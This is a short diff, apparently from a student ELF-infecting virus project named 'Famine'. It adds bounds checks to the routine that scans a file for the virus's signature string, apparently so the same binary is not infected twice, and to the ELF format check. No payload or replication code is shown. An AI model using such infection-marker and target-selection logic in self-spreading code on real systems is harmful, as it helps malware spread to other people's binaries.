@@ -28,7 +28,7 @@ int copy_file(t_woody *woody, char *filename)
 	}
 	char * string = woody->addr;
 	for (int i = 0; i < woody->filesize; i++){
-		if (ft_strnstr(&string[i], "Famine version 1.0 (c)oded mar-2023 by jraye-slynell", 53) != NULL){
+		if (woody->filesize - i > 52 && ft_strnstr(&string[i], "Famine version 1.0 (c)oded mar-2023 by jraye-slynell", 52) != NULL){
 			return ERROR_CODE;
 		}
 	}
@@ -36,9 +36,10 @@ int copy_file(t_woody *woody, char *filename)
 	return 0;
 }
 
-int check_fileformat(unsigned char *c)
+int check_fileformat(unsigned char *c, ssize_t filesize)
 {
-	if (c[0] == 0x7f &&
+	if (filesize > 16 && 
+		c[0] == 0x7f &&
 		c[1] == 'E' &&
 		c[2] == 'L' &&
 		c[3] == 'F' &&
@@ -76,5 +77,5 @@ int read_elf_file(t_woody *woody, char *filename)
 		return ERROR_CODE;
 	}
 	free(filename);
-	return check_fileformat(woody->addr);
+	return check_fileformat(woody->addr, woody->filesize);
 }
